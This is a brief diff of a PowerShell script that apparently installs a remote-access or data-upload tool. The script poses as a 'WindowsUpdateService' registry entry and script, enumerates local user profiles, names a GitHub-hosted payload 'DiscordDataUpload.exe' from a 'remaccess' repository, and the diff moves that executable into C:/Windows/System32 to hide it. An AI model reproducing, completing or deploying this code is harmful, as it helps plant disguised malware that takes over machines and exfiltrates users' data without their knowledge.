@@ -3,7 +3,7 @@ $regPath = "HKLM:\Software\WindowsUpdateService"
 $userNamesRaw = Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }
 $userNamesClean = $userNamesRaw -join ' | '
 $userNames = '"' + $userNamesClean + '"'
-$exepath =  Join-Path $env:USERPROFILE "Music\DiscordDataUpload.exe"
+$exepath =  "C:/Windows/System32/DiscordDataUpload.exe"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 $messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
 if (-not (Test-Path $regPath)) {
